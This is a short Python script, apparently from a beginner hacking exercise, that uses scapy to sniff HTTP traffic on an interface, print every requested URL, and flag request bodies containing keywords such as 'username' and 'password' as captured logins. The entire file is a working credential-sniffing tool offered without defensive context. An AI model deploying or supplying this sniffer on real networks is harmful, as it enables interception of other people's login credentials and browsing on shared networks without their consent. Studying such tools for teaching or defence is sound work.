import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)


def process_sniffed_packet(packet):
    keyword = ["uname", "username", "user", "login", "password", "pass"]
    if packet.haslayer(http.HTTPRequest):

        path = packet[http.HTTPRequest].Path
        host = packet[http.HTTPRequest].Host
        url = host + path
        print("[+] URL found:" + url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for key in keyword:
                if key in load:
                    print("[*] Possible login detected:" + load)
                    break


def main():
    sniff("eth0")


if __name__ == "__main__":
    main()
